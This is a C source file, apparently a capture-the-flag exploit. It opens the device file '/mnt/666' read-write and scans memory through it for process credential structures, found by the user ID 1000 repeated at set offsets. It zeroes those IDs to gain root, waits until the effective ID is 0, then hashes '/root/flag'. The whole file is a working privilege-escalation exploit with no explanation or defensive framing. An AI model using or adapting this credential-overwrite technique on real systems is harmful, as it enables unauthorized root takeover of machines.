#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/mman.h>

#define UID 1000

unsigned char *buf;
unsigned long len;

int search(int i)
{
    short *uid;
    short *end;
    short val = 0;
    end = buf + len;
    uid = buf;
    while (uid < end - 156)
    {
        if (*uid == UID)
        {
            if (*uid == UID && *(uid + 24) == UID && *(uid + 68) == UID && *(uid + 78) == UID)
            {
                printf("GOOD:%016x\n", i * len + (unsigned int)((unsigned char *)uid - buf));
                *uid = 0;
                *(uid + 24) = 0;
                *(uid + 68) = 0;
                *(uid + 78) = 0;
                return 0;
            }
        }
        uid++;
    }
    return 0;
}

int main(int argc, char *argv[])
{
    int fd;
    int r;
    len = 0x100000;
    buf = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);

    if (buf <= 0)
    {
        perror("mmap");
    }
    fd = open("/mnt/666", O_RDWR);
    if (fd < 0)
    {
        perror("open");
    }

    if (argc == 2)
    {
        unsigned long offset;
        offset = strtol(argv[1], NULL, 16);
        printf("write offset:%016x\n", offset);
        r = lseek(fd, offset & 0xfffffffffffff000, SEEK_SET);
        if (r < 0)
        {
            perror("lseek");
        }
        r = read(fd, buf, 0x2000);
        if (r < 0)
        {
            perror("read");
        }
        // modify
        search(0);
        // write back
        r = lseek(fd, offset & 0xfffffffffffff000, SEEK_SET);
        if (r < 0)
        {
            perror("lseek");
        }
        r = write(fd, buf, 0x2000);
        if (r < 0)
        {
            perror("write");
        }
        puts("wait");
        while (geteuid() != 0 && getegid() != 0)
        {
            sleep(1);
        }
        puts("root!");
    }
    r = lseek(fd, 0x0, SEEK_SET);
    if (r < 0)
    {
        perror("lseek");
    }
    for (unsigned long i = 0; i < 0x38000000 / len; i++)
    {
        r = lseek(fd, i * len, SEEK_SET);
        if (r < 0)
        {
            perror("lseek");
        }
        r = read(fd, buf, len);
        if (r < 0)
        {
            perror("read");
        }
        search(i);
    }

    // r = read(fd, buf, 1);
    munmap(buf, len);
    puts("wait");
    while (geteuid() != 0 && getegid() != 0)
    {
        sleep(1);
    }
    printf("ROOT!\n");
    system("sha256sum /root/flag");

    return 0;
}